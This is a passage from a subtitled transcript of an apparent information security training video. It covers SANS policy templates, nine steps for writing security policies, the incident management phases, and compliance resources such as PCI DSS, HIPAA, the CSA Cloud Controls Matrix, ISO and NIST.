00:27:05.260\nBut when you go out and\n\n527\n00:27:05.260 --> 00:27:09.400\nyou think about you know back in the 80s\nwhen I started having to do this and\n\n528\n00:27:09.400 --> 00:27:13.690\nI got into this field, there was not\nthe kind of resources that we have today.\n\n529\n00:27:13.690 --> 00:27:16.180\nThe Internet did not exist\nthe way it does today.\n\n530\n00:27:16.180 --> 00:27:19.355\nThe resources we're gonna show you\ndid not exist, they were not there.\n\n531\n00:27:19.355 --> 00:27:22.165\nAnd one of these resources,\nthe one that Mike has up right now,\n\n532\n00:27:22.165 --> 00:27:25.555\nis one that is great because\nit gives you unbiased,\n\n533\n00:27:27.065 --> 00:27:30.205\nunfettered information that's\nnot linked to any vendor.\n\n534\n00:27:30.205 --> 00:27:33.250\nThis is just information that's\navailable through a great organization,\n\n535\n00:27:33.250 --> 00:27:36.780\none of many out there that does a lot\nof great work in our community,\n\n536\n00:27:36.780 --> 00:27:40.160\nessentially passing around information,\nmake it available to all.\n\n537\n00:27:40.160 --> 00:27:43.448\nInformation Security Professional Sans,\nif you're not familiar with that,\n\n538\n00:27:43.448 --> 00:27:45.130\nyou should definitely take\na look at their site.\n\n539\n00:27:45.130 --> 00:27:48.714\nOne of the things they do is they have, in\nthe Reading Room in some of the areas they\n\n540\n00:27:48.714 --> 00:27:51.322\nhave, they have an information\nsecurity template site.\n\n541\n00:27:51.322 --> 00:27:56.195\nYou can download policy templates in\na variety of areas in both, excuse me,\n\n542\n00:27:56.195 --> 00:27:58.110\nWord and PDF format for free.\n\n543\n00:27:58.110 --> 00:28:01.780\nAll you have to do is click on the\nappropriate item, download the template,\n\n544\n00:28:01.780 --> 00:28:02.680\nit's cut and paste.\n\n545\n00:28:02.680 --> 00:28:05.840\nIt has a insert company\nname here kind of thing.\n\n546\n00:28:05.840 --> 00:28:08.700\nYou put your company name in and\nyou can get a template for\n\n547\n00:28:08.700 --> 00:28:14.050\nfree on like 40 or so of the most\ncommon policies you may have to write.\n\n548\n00:28:14.050 --> 00:28:17.460\nWhen I started doing this years ago,\nnobody came to me and said, hey, here's\n\n549\n00:28:17.460 --> 00:28:21.130\na five page template and all you gotta do\nis put your name in and it's ready to go.\n\n550\n00:28:21.130 --> 00:28:23.980\nSomebody said, hey,\nyou gotta write this thing and by the way,\n\n551\n00:28:23.980 --> 00:28:25.105\nwe want it tomorrow morning.\n\n552\n00:28:25.105 --> 00:28:26.450\n>> [LAUGH] Yeah, from scratch.\n\n553\n00:28:26.450 --> 00:28:27.260\nYeah.\n>> Yeah.\n\n554\n00:28:27.260 --> 00:28:29.940\nAnd back then, yeah,\nwe were using chisels and rocks.\n\n555\n00:28:29.940 --> 00:28:30.870\n>> [LAUGH]\n>> Like you see in the old\n\n556\n00:28:30.870 --> 00:28:31.785\nFlintstone cartoons.\n\n557\n00:28:31.785 --> 00:28:32.720\n>> Uh-huh.\n>> Wait, let me take your\n\n558\n00:28:32.720 --> 00:28:33.700\npicture in the car.\n\n559\n00:28:33.700 --> 00:28:35.990\nThe bird's in there,\nit's chiseling it out.\n\n560\n00:28:35.990 --> 00:28:37.410\nNobody had this stuff.\n\n561\n00:28:37.410 --> 00:28:40.185\nAnd if you had it,\nyou didn't give it to anybody, right?\n\n562\n00:28:40.185 --> 00:28:43.470\nBecause you knew what a pain in the ass\nit was to make it, And you kept it for\n\n563\n00:28:43.470 --> 00:28:44.590\nyourself, right?\n\n564\n00:28:44.590 --> 00:28:46.710\nSo the reality is back in the old days,\n\n565\n00:28:46.710 --> 00:28:49.450\nit was a lot tougher to be\nan information security professional.\n\n566\n00:28:49.450 --> 00:28:52.220\nToday, we make it a lot easier for\nyou to find this stuff.\n\n567\n00:28:52.220 --> 00:28:55.291\nSo this is, one of those is gonna be very\nhelpful for you with regards to policies,\n\n568\n00:28:55.291 --> 00:28:59.580\nso I get asked all the time, hey, I'm just\nstarting out, how do I write a policy?\n\n569\n00:28:59.580 --> 00:29:02.410\nI know the concept,\nI just don't really know what to do.\n\n570\n00:29:02.410 --> 00:29:04.460\nHow do I start, what does it look like?\n\n571\n00:29:04.460 --> 00:29:06.480\nAnd that's tough if you've\nnever done one before, right?\n\n572\n00:29:06.480 --> 00:29:08.790\n>> Absolutely.\n>> And if somebody gives you a little hint\n\n573\n00:29:08.790 --> 00:29:11.110\nand pushes you in the right direction,\nthen that's great.\n\n574\n00:29:11.110 --> 00:29:13.870\nIt's better for you, it's better for\nall of us in the community.\n\n575\n00:29:13.870 --> 00:29:15.930\nIt's better for your business,\neverybody wins.\n\n576\n00:29:15.930 --> 00:29:18.790\nYou've got better policies,\nyour company's gonna be better protected,\n\n577\n00:29:18.790 --> 00:29:20.240\nand ultimately everybody wins.\n\n578\n00:29:20.240 --> 00:29:24.030\nSo there's no reason not to share\nthis information with you out there.\n\n579\n00:29:24.030 --> 00:29:25.950\nSo make sure you're aware of that, right?\n\n580\n00:29:25.950 --> 00:29:27.690\nWe got to go out and create a good policy.\n\n581\n00:29:27.690 --> 00:29:29.030\nWhat are the steps involved?\n\n582\n00:29:29.030 --> 00:29:31.980\nIt's very important to think about\nthe steps involved with creating a policy.\n\n583\n00:29:31.980 --> 00:29:35.220\nYou got the template there, but\nwhat's the thought process behind this?\n\n584\n00:29:35.220 --> 00:29:36.500\nLet's quickly talk about it.\n\n585\n00:29:36.500 --> 00:29:39.430\nYou gotta go out and do a risk assessment\nfirst of all to figure out what it\n\n586\n00:29:39.430 --> 00:29:42.760\nis you wanna identify that may\nneed a policy to associate.\n\n587\n00:29:42.760 --> 00:29:45.770\nYou gotta then go out and\nlook for what standards and\n\n588\n00:29:45.770 --> 00:29:48.050\nguidelines may already exist.\n\n589\n00:29:48.050 --> 00:29:51.410\nI need a policy that deals with\nelectronic records management in\n\n590\n00:29:51.410 --> 00:29:52.650\nthe healthcare industry.\n\n591\n00:29:52.650 --> 00:29:55.517\nI'm involved with healthcare\nin the United States,\n\n592\n00:29:55.517 --> 00:29:59.656\nI know there's this law called HIPAA,\nI gotta figure out how to manage that,\n\n593\n00:29:59.656 --> 00:30:04.054\nI've done a risk assessment and I've got\nsome sort of exposure with confidential\n\n594\n00:30:04.054 --> 00:30:07.136\nrecords from various patients,\nI got to deal with that.\n\n595\n00:30:07.136 --> 00:30:07.911\nAre there standards or\n\n596\n00:30:07.911 --> 00:30:09.755\nare there guidelines out\nthere that I have to look to?\n\n597\n00:30:09.755 --> 00:30:10.405\nAbsolutely.\n\n598\n00:30:10.405 --> 00:30:14.343\nThere's a 400 page piece of legislation or\nprobably a thousand pages or\n\n599\n00:30:14.343 --> 00:30:18.890\nmore that you can look at with guidance\nthat's gonna help you to understand that.\n\n600\n00:30:18.890 --> 00:30:21.334\nWe gotta take a look at it and\ntalk to senior management,\n\n601\n00:30:21.334 --> 00:30:22.690\nget them into the loop, here.\n\n602\n00:30:22.690 --> 00:30:27.634\nNothing, and I repeat, absolutely nothing\nwill ever take take place in your world if\n\n603\n00:30:27.634 --> 00:30:31.343\nyou do this right way without buying and\nwithout information and\n\n604\n00:30:31.343 --> 00:30:36.219\nawareness on the part of senior management\ninside the organization as I catch my hair\n\n605\n00:30:36.219 --> 00:30:38.350\nbecause it is getting caught.\n\n606\n00:30:38.350 --> 00:30:41.020\nI'm doing this and\nit's like dragging me this way cuz that's\n\n607\n00:30:41.020 --> 00:30:43.305\nwhat happens when you have long hair and\nyou put it back in a ponytail.\n\n608\n00:30:43.305 --> 00:30:45.132\nShame you you,\nyou were supposed to remind me.\n\n609\n00:30:45.132 --> 00:30:47.054\n>> Oops, sorry, I do that.\n\n610\n00:30:47.054 --> 00:30:49.240\n>> He's falling down on the job, Mr. Mike.\n\n611\n00:30:49.240 --> 00:30:51.070\nSo we gotta get senior\nmanagement involved.\n\n612\n00:30:51.070 --> 00:30:53.680\nAs a matter of fact, I want you all out\nthere to raise your hand right now.\n\n613\n00:30:53.680 --> 00:30:55.920\nYou're gonna do this with me,\nso can we go to a wide shot?\n\n614\n00:30:55.920 --> 00:30:56.670\nWe're gonna take an oath,\n\n615\n00:30:56.670 --> 00:30:59.960\nso we're gonna raise our-\n>> Right, left?\n\n616\n00:30:59.960 --> 00:31:02.670\n>> Yeah, I'm just trying to make\nsure because on the camera it's\n\n617\n00:31:02.670 --> 00:31:03.620\nthe opposite way.\n\n618\n00:31:03.620 --> 00:31:06.170\nLeft, we're gonna put our left hand up and\nall of you are gonna take an oath with me.\n\n619\n00:31:06.170 --> 00:31:07.910\nYou're all gonna promise\nto do the following.\n\n620\n00:31:07.910 --> 00:31:09.610\nI, insert you name.\n\n621\n00:31:09.610 --> 00:31:10.340\n>> I, insert my name.\n\n622\n00:31:10.340 --> 00:31:11.460\n>> Just like in Animal House, right?\n\n623\n00:31:11.460 --> 00:31:12.410\nI, insert my name.\n\n624\n00:31:12.410 --> 00:31:16.740\nI, whatever you are,\nwhoever you are, do solemnly promise.\n\n625\n00:31:16.740 --> 00:31:17.950\n>> Do solemnly promise.\n\n626\n00:31:17.950 --> 00:31:19.950\n>> Notice I did not swear\nbecause swearing's not nice.\n\n627\n00:31:19.950 --> 00:31:20.560\n>> No, it's not.\n\n628\n00:31:20.560 --> 00:31:23.280\n>> Do solemnly promise to always.\n\n629\n00:31:23.280 --> 00:31:24.050\n>> To always.\n\n630\n00:31:24.050 --> 00:31:24.689\n>> Always.\n\n631\n00:31:26.180 --> 00:31:28.920\n>> Always, to always-\n>> Stress always,\n\n632\n00:31:28.920 --> 00:31:32.660\nunderline always, to always include.\n\n633\n00:31:32.660 --> 00:31:33.280\n>> Always include.\n\n634\n00:31:33.280 --> 00:31:34.340\n>> Senior management.\n\n635\n00:31:34.340 --> 00:31:35.420\n>> Senior management.\n\n636\n00:31:35.420 --> 00:31:36.080\n>> In any.\n\n637\n00:31:36.080 --> 00:31:36.700\n>> In any.\n\n638\n00:31:36.700 --> 00:31:37.600\n>> And all.\n\n639\n00:31:37.600 --> 00:31:38.180\n>> And all.\n\n640\n00:31:38.180 --> 00:31:39.020\n>> Conversations.\n\n641\n00:31:39.020 --> 00:31:39.830\n>> Conversations.\n\n642\n00:31:39.830 --> 00:31:40.870\n>> About security.\n\n643\n00:31:40.870 --> 00:31:41.780\n>> About security.\n\n644\n00:31:41.780 --> 00:31:42.770\n>> Period, end of sentence.\n\n645\n00:31:42.770 --> 00:31:44.060\n>> Period, end of sentence.\n\n646\n00:31:44.060 --> 00:31:48.040\n>> It's very important because if you\ndon't pursue this with senior management,\n\n647\n00:31:48.040 --> 00:31:51.724\nYou are not following the proper\nprocedures, you are not following what we\n\n648\n00:31:51.724 --> 00:31:54.883\nwould consider to be best practices,\nand you are gonna go off and\n\n649\n00:31:54.883 --> 00:31:58.277\nmake decisions that are not gonna\nbe supported by the organization,\n\n650\n00:31:58.277 --> 00:32:00.066\nnecessarily, and that's a risk.\n\n651\n00:32:00.066 --> 00:32:02.161\nAnd that can lead to vulnerability, and\n\n652\n00:32:02.161 --> 00:32:05.743\nthat could lead to potentially\nexposure and all sorts of bad things.\n\n653\n00:32:05.743 --> 00:32:09.215\nYou have to set clear penalties if\nthose policies that you're gonna create\n\n654\n00:32:09.215 --> 00:32:10.105\nare not followed.\n\n655\n00:32:10.105 --> 00:32:14.426\nWhat are the expectations and what are\nessentially the violations that can occur.\n\n656\n00:32:14.426 --> 00:32:15.960\nAnd how do we deal with them.\n\n657\n00:32:15.960 --> 00:32:18.430\nWe have to make sure the final\nversion of the policy.\n\n658\n00:32:18.430 --> 00:32:22.300\nWhatever we write is communicated out\nto everybody, is gonna be available,\n\n659\n00:32:22.300 --> 00:32:27.410\nput up on a Skydrive,\nmade available by email sent to everybody.\n\n660\n00:32:27.410 --> 00:32:28.970\nWhatever it is, you gotta do all that.\n\n661\n00:32:28.970 --> 00:32:31.320\nWe gotta make sure that everybody reads,\nsigns and\n\n662\n00:32:31.320 --> 00:32:33.940\nacknowledges that policy in some way or\nform.\n\n663\n00:32:33.940 --> 00:32:34.970\nIt could be online.\n\n664\n00:32:34.970 --> 00:32:37.320\nIt could be part of the employee\nhandbook when they start.\n\n665\n00:32:37.320 --> 00:32:39.060\nYou know, it could be yearly.\n\n666\n00:32:39.060 --> 00:32:40.120\nOr review and refresh.\n\n667\n00:32:40.120 --> 00:32:41.910\nThere's all these\ndifference ways to do this.\n\n668\n00:32:41.910 --> 00:32:45.440\nYou have to make sure you have tools\nin place to employ the policy,\n\n669\n00:32:45.440 --> 00:32:49.420\ndeploy it, and ultimately to make sure\nthat it is going to be implemented.\n\n670\n00:32:49.420 --> 00:32:51.350\nSo you've got to be able\nto enforce the policies.\n\n671\n00:32:51.350 --> 00:32:54.690\nSo we have to think about monitoring and\nthings like that.\n\n672\n00:32:54.690 --> 00:32:56.000\nWe have to be able to train everybody.\n\n673\n00:32:56.000 --> 00:32:56.880\nWe talked about training and\n\n674\n00:32:56.880 --> 00:33:00.890\nawareness and we have to review and\nupdate that policy on an ongoing basis.\n\n675\n00:33:00.890 --> 00:33:01.850\nNine steps.\n\n676\n00:33:01.850 --> 00:33:03.200\nVery, very important.\n\n677\n00:33:03.200 --> 00:33:04.710\nRisk assessment.\n\n678\n00:33:04.710 --> 00:33:06.710\nValidate the existing architecture and\n\n679\n00:33:06.710 --> 00:33:09.670\nmake sure that if there is\nguidance we pay attention to it.\n\n680\n00:33:09.670 --> 00:33:11.360\nSenior management buy in.\n\n681\n00:33:11.360 --> 00:33:12.680\nSet clear priorities and\n\n682\n00:33:12.680 --> 00:33:15.950\nclear penalties in the policies so\neverybody understand what we're doing.\n\n683\n00:33:15.950 --> 00:33:18.190\nMake sure the final version\nis communicated broadly and\n\n684\n00:33:18.190 --> 00:33:19.040\neffectively at everybody.\n\n685\n00:33:19.040 --> 00:33:22.110\nWe're gonna switch to this hand and\nstart counting again over here.\n\n686\n00:33:22.110 --> 00:33:23.810\nRead, sign, and understand the policy.\n\n687\n00:33:23.810 --> 00:33:25.720\nMake sure everybody does that, right?\n\n688\n00:33:25.720 --> 00:33:28.090\nMake sure we have tools in\nplace to enforce the policy.\n\n689\n00:33:29.140 --> 00:33:32.090\nTrain employees and\nreview and update regularly.\n\n690\n00:33:32.090 --> 00:33:34.740\nTotal of nine, total of nine steps.\n\n691\n00:33:34.740 --> 00:33:36.430\nWe wanna make sure we know what those are.\n\n692\n00:33:36.430 --> 00:33:39.835\nVery, very important for us to be thinking\nabout them and to understand the steps\n\n693\n00:33:39.835 --> 00:33:43.420\ninvolved so that we can walk through\nthat and in our mind be aware of that.\n\n694\n00:33:43.420 --> 00:33:45.560\nHow do we deal with things\nlike physical security, right?\n\n695\n00:33:45.560 --> 00:33:46.170\nWho's coming in?\n\n696\n00:33:46.170 --> 00:33:47.080\nWhere they're coming from?\n\n697\n00:33:47.080 --> 00:33:49.160\nHow do we deal with\nnetwork based security?\n\n698\n00:33:49.160 --> 00:33:49.960\nWho's communicating?\n\n699\n00:33:49.960 --> 00:33:50.900\nWho's connecting?\n\n700\n00:33:50.900 --> 00:33:52.195\nHow do we deal with information.\n\n701\n00:33:52.195 --> 00:33:53.225\nTraffic flow.\n\n702\n00:33:53.225 --> 00:33:54.775\nDLP Data Loss Prevention.\n\n703\n00:33:54.775 --> 00:33:56.135\nWhat's going through our systems?\n\n704\n00:33:56.135 --> 00:33:59.405\nThese are all places where we may\nwant to think about defense and\n\n705\n00:33:59.405 --> 00:34:02.185\ndepth architecture, and\nwe may want to think about\n\n706\n00:34:02.185 --> 00:34:06.070\nthe kinds of things that we have to do and\nthe kinds of policies we have to create.\n\n707\n00:34:06.070 --> 00:34:08.200\nWith a physical security area, and\n\n708\n00:34:08.200 --> 00:34:12.470\na focus we may want to think about,\nI don't know, entry and exit controls.\n\n709\n00:34:12.470 --> 00:34:15.010\nWho's coming in the door\nunder what circumstance?\n\n710\n00:34:15.010 --> 00:34:16.730\nDo we know who they are or\nwhere they're coming from?\n\n711\n00:34:16.730 --> 00:34:17.440\nFor instance.\n\n712\n00:34:17.440 --> 00:34:18.600\nThat would be important.\n\n713\n00:34:18.600 --> 00:34:21.940\nWe want to be thinking about ingress and\negress, access control.\n\n714\n00:34:21.940 --> 00:34:23.930\nYou know.\nAll sorts of stuff that may come up\n\n715\n00:34:23.930 --> 00:34:25.730\nthat we may want to think about and\nalso write policies around.\n\n716\n00:34:25.730 --> 00:34:28.440\nWe have to think about\nincident management and\n\n717\n00:34:28.440 --> 00:34:30.510\nthe ways in which we can\ndeal with incidents.\n\n718\n00:34:30.510 --> 00:34:31.190\nWhen they occur.\n\n719\n00:34:31.190 --> 00:34:35.100\nOne of the most important things people\ndo, or in this case don't do depending on\n\n720\n00:34:35.100 --> 00:34:38.340\nwhere they come from, is to understand\nthat when something happens.\n\n721\n00:34:38.340 --> 00:34:40.930\nAnd we'll talk a lot about\nthis in upcoming episodes,\n\n722\n00:34:40.930 --> 00:34:44.140\nthat we clearly have a set of steps\nthat have been documented, and\n\n723\n00:34:44.140 --> 00:34:47.190\nthat we have trained on and\nthat we follow to respond.\n\n724\n00:34:47.190 --> 00:34:50.030\nIn other words, we shouldn't just randomly\njust run around screaming, my God.\n\n725\n00:34:50.030 --> 00:34:52.430\nSomebody hacked into Mike's computer.\n\n726\n00:34:52.430 --> 00:34:55.480\nOr why is Mike's computer\ndoing all this crazy stuff?\n\n727\n00:34:55.480 --> 00:34:58.120\nWe have a virus or who knows what,\nright, whatever can happen.\n\n728\n00:34:58.120 --> 00:35:01.710\nWe have to think about the fact\nthat we have a clearly articulated\n\n729\n00:35:01.710 --> 00:35:03.660\nset of steps that we can follow.\n\n730\n00:35:03.660 --> 00:35:06.910\nAnd we have to understand that we call\nthat an incident management process.\n\n731\n00:35:06.910 --> 00:35:09.270\nAnd there's a set of steps\nthat are documented,\n\n732\n00:35:09.270 --> 00:35:12.420\nwell thought out, that go into most\nincident management processes.\n\n733\n00:35:12.420 --> 00:35:14.140\nLet's quickly talk about what they are.\n\n734\n00:35:14.140 --> 00:35:17.000\nWe have to think about and prepare\nincident handling response, of course,\n\n735\n00:35:17.000 --> 00:35:19.070\nso Step one is kind of preparation, right?\n\n736\n00:35:19.070 --> 00:35:21.970\nThink about all the things we would have\nto do ahead of time, who are the members\n\n737\n00:35:21.970 --> 00:35:26.540\nof the team that we're going to call on,\ndo we pre-position some resources,\n\n738\n00:35:26.540 --> 00:35:30.980\ndo we have a potential\nforensic examination\n\n739\n00:35:30.980 --> 00:35:34.670\ncapability that we contract with outside\nthe organization so we can call on it.\n\n740\n00:35:34.670 --> 00:35:36.790\nThere are things we can do to plan, right?\n\n741\n00:35:36.790 --> 00:35:40.520\nThen we have to detect and analyze so\nwe have to think about what went on and\n\n742\n00:35:40.520 --> 00:35:43.290\nessentially how to understand it,\nwhatever it may be, right?\n\n743\n00:35:43.290 --> 00:35:46.250\nWe have to classify and\nprioritize what we are finding, so\n\n744\n00:35:46.250 --> 00:35:49.480\nwe have to understand it in some way\nto be able to look at Mike's machine.\n\n745\n00:35:49.480 --> 00:35:54.250\nAnd go yep, that looks like malware as\nopposed to that looks specifically like\n\n746\n00:35:54.250 --> 00:35:57.860\na trojan of this type or\nthis kind or it's a root kit or\n\n747\n00:35:57.860 --> 00:36:01.270\nit's not any of those things,\nit's just somebody connecting in and\n\n748\n00:36:01.270 --> 00:36:05.420\nusing a little stupid program to put a\nconsole message up or something like that.\n\n749\n00:36:05.420 --> 00:36:07.120\nSo we have to classify and prioritize.\n\n750\n00:36:07.120 --> 00:36:08.420\nWe have to notify.\n\n751\n00:36:08.420 --> 00:36:11.790\nWho are the people involved that have been\ntold that there's a problem and if so\n\n752\n00:36:11.790 --> 00:36:13.870\nunder what conditions do we notify them?\n\n753\n00:36:13.870 --> 00:36:16.300\nWe have to focus on containment,\nstep number five.\n\n754\n00:36:16.300 --> 00:36:18.280\nRight?\nStop that machine from being able to talk\n\n755\n00:36:18.280 --> 00:36:22.750\nto others and stop the information that's\non it from being spread good or bad.\n\n756\n00:36:22.750 --> 00:36:27.010\nWe may unplug the network cable,\nwe may take steps to isolate the machine.\n\n757\n00:36:27.010 --> 00:36:30.506\nThere's a lot of things we could do but\nwe probably we wanna turn machine off,\n\n758\n00:36:30.506 --> 00:36:33.370\nif we turn the machine off we\nlose all the valuable evidence.\n\n759\n00:36:33.370 --> 00:36:36.600\nThat is in there and forensically we may\nlose the opportunity to examine that\n\n760\n00:36:36.600 --> 00:36:38.390\nmachine and see what was going on with it.\n\n761\n00:36:38.390 --> 00:36:41.330\nWe will forensically examine\nit in step six, eradicate and\n\n762\n00:36:41.330 --> 00:36:45.160\nrecover in step seven, get rid of all the\nthings that may be going on in there, and\n\n763\n00:36:45.160 --> 00:36:47.830\nin step eight we have to deal\nwith post incident activities.\n\n764\n00:36:47.830 --> 00:36:52.620\nWe have to go in and actually figure out\nhow to prevent that from happening again.\n\n765\n00:36:52.620 --> 00:36:54.790\nWe may take steps to change the baseline.\n\n766\n00:36:54.790 --> 00:36:58.460\nWe may go in and we not may, we should and\n\n767\n00:36:58.460 --> 00:37:02.340\nwill hopefully do a lessons learned or\na post implementation review.\n\n768\n00:37:02.340 --> 00:37:07.020\nProject management, it's called a PIR or\na post mortem or lessons earned review,\n\n769\n00:37:07.020 --> 00:37:09.870\nwhere we examine the incident\ntrying to see what went wrong and\n\n770\n00:37:09.870 --> 00:37:11.880\nlearn what we can do\ndifferently after the fact.\n\n771\n00:37:11.880 --> 00:37:14.580\nWe wanna take advantage of\nall those things, right.\n\n772\n00:37:14.580 --> 00:37:15.170\nThink about them.\n\n773\n00:37:15.170 --> 00:37:17.720\nVulnerability assessments\nmay be important here and\n\n774\n00:37:17.720 --> 00:37:19.710\npen tests may be important as well.\n\n775\n00:37:19.710 --> 00:37:23.150\nWe did talk about some of the legal\nsites and things I wanted to.\n\n776\n00:37:23.150 --> 00:37:24.670\n>> Mm hm.\n>> I just know quickly as we rap up,\n\n777\n00:37:24.670 --> 00:37:26.550\nwanted to just show you\nmaybe a couple of websites.\n\n778\n00:37:26.550 --> 00:37:29.550\nThat will help us understand the framing\nof these kind of conversations.\n\n779\n00:37:29.550 --> 00:37:31.150\nI mentioned a bunch of them already.\n\n780\n00:37:31.150 --> 00:37:33.060\nI mentioned PCI DSS.\n\n781\n00:37:33.060 --> 00:37:37.470\nYou could see on the screen in front\nof you that we have the generic PCI DSS\n\n782\n00:37:37.470 --> 00:37:43.507\nwebsite, the portal I believe entering\ninto the discussion about PCI DSS 3.02 or\n\n783\n00:37:43.507 --> 00:37:44.470\n3.2.\n\n784\n00:37:44.470 --> 00:37:48.030\nThe newest version right now the download\nlink for that, you always want to check\n\n785\n00:37:48.030 --> 00:37:50.960\nthese websites and make sure you\nhave the most recent version.\n\n786\n00:37:50.960 --> 00:37:52.390\nThat was version 3.01.\n\n787\n00:37:52.390 --> 00:37:55.750\nNot that long ago it recently\nwent through another revision and\n\n788\n00:37:55.750 --> 00:37:58.770\nthere's an interesting conversation\nthere about the slight updates and\n\n789\n00:37:58.770 --> 00:38:01.220\nthe align and realignment as we go but\n\n790\n00:38:01.220 --> 00:38:04.660\nyou want to make sure you're aware\nof PCIDSS standards as we've said.\n\n791\n00:38:04.660 --> 00:38:06.230\nWhat's up next there in the list?\n\n792\n00:38:06.230 --> 00:38:09.170\nThat one is the Sarbanes-Oxley\nwebsite if I'm not mistaken, right.\n\n793\n00:38:09.170 --> 00:38:11.385\nSo some information about Sarb-Ox.\n\n794\n00:38:11.385 --> 00:38:15.740\nAnd in the United States if you are a\nbusiness here that is publicly traded and\n\n795\n00:38:15.740 --> 00:38:20.475\nis on the stock exchange or listed, you\nhave legal responsibilities and financial\n\n796\n00:38:20.475 --> 00:38:23.925\nresponsibilities under the Sarbanes-Oxley\nAct here in the United States.\n\n797\n00:38:23.925 --> 00:38:27.485\nAnd you're essentially monitored by and\nregulated by the Federal Government.\n\n798\n00:38:27.485 --> 00:38:30.815\nSo you have to follow the steps and\nthe guidance laid out under Sarb-Ox.\n\n799\n00:38:30.815 --> 00:38:32.460\nYou would want to be aware of that.\n\n800\n00:38:32.460 --> 00:38:36.640\nIf you are dealing with the healthcare\nindustry in the United States.\n\n801\n00:38:36.640 --> 00:38:41.220\nThe [COUGH] excuse me, the HIPAA\nact is gonna be important for you.\n\n802\n00:38:41.220 --> 00:38:46.350\nThe HHS.gov website which you can\nsee there for health information\n\n803\n00:38:46.350 --> 00:38:50.520\nprivacy will be a starting point for\nyou in terms of reference and information.\n\n804\n00:38:50.520 --> 00:38:54.411\nAbout not only the standard and\nthe activities allowed but you know\n\n805\n00:38:54.411 --> 00:38:57.870\nguidance and tool sets and all sorts\nof things you may use and find there.\n\n806\n00:38:57.870 --> 00:39:00.640\nAs an information security\nprofessional very important and\n\n807\n00:39:00.640 --> 00:39:03.170\nwe got some ISo standards\nup there somewhere.\n\n808\n00:39:03.170 --> 00:39:05.000\nWe can do CSA next, that's fine.\n\n809\n00:39:05.000 --> 00:39:06.610\nCloud Security Alliance.\n\n810\n00:39:06.610 --> 00:39:07.840\nSomething we'll talk about and\n\n811\n00:39:07.840 --> 00:39:10.622\ncome back to again when we\nget into cloud computing and\n\n812\n00:39:10.622 --> 00:39:15.140\ndiscussions of cloud computing and hacking\nlater on in some of the upcoming episodes.\n\n813\n00:39:15.140 --> 00:39:17.090\nBut the Cloud Security Alliance,\ngreat group.\n\n814\n00:39:17.090 --> 00:39:18.080\nJust like SANS.\n\n815\n00:39:18.080 --> 00:39:19.460\nJust like PCI.\n\n816\n00:39:19.460 --> 00:39:22.860\nA lot of information out there from\ndifferent areas, they have something\n\n817\n00:39:22.860 --> 00:39:27.810\ncalled the Cloud Controls Matrix, which is\na spreadsheet that brings together a lot\n\n818\n00:39:27.810 --> 00:39:30.810\nof the guidance we're talking about\nin all these other areas, aligns it.\n\n819\n00:39:30.810 --> 00:39:34.360\nSo you could see the control element and\nall the different references to how it's\n\n820\n00:39:34.360 --> 00:39:37.400\nimplemented in all these different\nframeworks across the board.\n\n821\n00:39:37.400 --> 00:39:39.940\nSo if you want to apply a control for\nidentity and\n\n822\n00:39:39.940 --> 00:39:45.530\naccess management using dual factor\nauthentication under ISO 27002, the CCM.\n\n823\n00:39:45.530 --> 00:39:50.530\nThe cloud controls matrix tells\nyou what that looks like there but\n\n824\n00:39:50.530 --> 00:39:56.950\nalso what it looks like for application or\nfor the use of that control in about 40\n\n825\n00:39:56.950 --> 00:40:00.310\ndifferent information security frameworks\naround the world simultaneously.\n\n826\n00:40:00.310 --> 00:40:03.910\nSo it's a really valuable resource, one\nyou can definitely take a look at as well.\n\n827\n00:40:03.910 --> 00:40:07.140\nWe've got the ISO,\ncouple of the ISO standards there.\n\n828\n00:40:07.140 --> 00:40:08.960\nThe interesting thing\nabout the ISO standards.\n\n829\n00:40:08.960 --> 00:40:13.980\nAlmost without exception, all of them\nare gonna require that you purchase them.\n\n830\n00:40:13.980 --> 00:40:17.536\nSo you have to understand that this may be\nsomething your company chooses to do to\n\n831\n00:40:17.536 --> 00:40:18.320\nbe aligned.\n\n832\n00:40:18.320 --> 00:40:22.770\nAnd there's typically a cost associated\nwith ISO certification, formerly.\n\n833\n00:40:22.770 --> 00:40:26.920\nBut, you have to pay usually a couple\nhundred dollars U.S. to get the standards.\n\n834\n00:40:26.920 --> 00:40:29.160\nBut, you can see\nan abstract of them online.\n\n835\n00:40:29.160 --> 00:40:31.700\nAnd so, when you go to the main\nlanding page of the library here\n\n836\n00:40:31.700 --> 00:40:32.990\nyou get a little summary.\n\n837\n00:40:32.990 --> 00:40:38.310\nAnd then as Mike clicked on the preview\nISO IUC 27000 whatever standard,\n\n838\n00:40:38.310 --> 00:40:41.720\nit takes you out to the library\nwhere you can see the overview.\n\n839\n00:40:41.720 --> 00:40:44.490\nYou can see the table of contents,\ntypically the preface, and\n\n840\n00:40:44.490 --> 00:40:46.500\nusually some of the information about it.\n\n841\n00:40:46.500 --> 00:40:49.570\nBut then if you wanna see the whole thing,\nyou have to actually buy the standard.\n\n842\n00:40:49.570 --> 00:40:52.040\nAnd he's just scrolling through and\nshowing you some of that there.\n\n843\n00:40:52.040 --> 00:40:54.030\nSo you just want to make\nsure you're aware of that,\n\n844\n00:40:54.030 --> 00:40:56.260\nthat you have a sense of\nthose kinds of things.\n\n845\n00:40:56.260 --> 00:41:00.010\nWe mentioned ISO 15408,\nwhich is a common criteria standard.\n\n846\n00:41:00.010 --> 00:41:01.800\nYou don't have that one up and\nthat's fine, but\n\n847\n00:41:01.800 --> 00:41:03.830\nthere's all these different\nones that we could look at.\n\n848\n00:41:03.830 --> 00:41:06.090\nDo you have the NIST government site,\nthe main NIST SP site?\n\n849\n00:41:06.090 --> 00:41:06.810\n>> Nope, but I can real quick.\n\n850\n00:41:06.810 --> 00:41:09.260\n>> You can bring up, Michael,\njust go out and search for the NIST SP,\n\n851\n00:41:09.260 --> 00:41:11.390\nthe special publications site.\n\n852\n00:41:11.390 --> 00:41:14.420\nThere's a bunch of different guidance\nthat Nessus puts out as well.\n\n853\n00:41:14.420 --> 00:41:17.270\nAlso very important for\nyou to be aware of and to think about.\n\n854\n00:41:17.270 --> 00:41:20.930\nAll these different areas, all these\ndifferent focal points will become\n\n855\n00:41:20.930 --> 00:41:25.190\ncritical for you and definitely things\nthat from again, a tool kit and\n\n856\n00:41:25.190 --> 00:41:28.760\nassessment perspective you would\nprobably wanna think about.\n\n857\n00:41:28.760 --> 00:41:31.560\nAnd probably just wanna make sure\nyou're aware of very very important for\n\n858\n00:41:31.560 --> 00:41:34.040\nus to do, again,\nbuild out our knowledge and\n\n859\n00:41:34.040 --> 00:41:37.720\nto have these different levers\nthat we can pull and to access.\n\n860\n00:41:38.960 --> 00:41:39.740\n>> Alright Adam.\n\n861\n00:41:39.740 --> 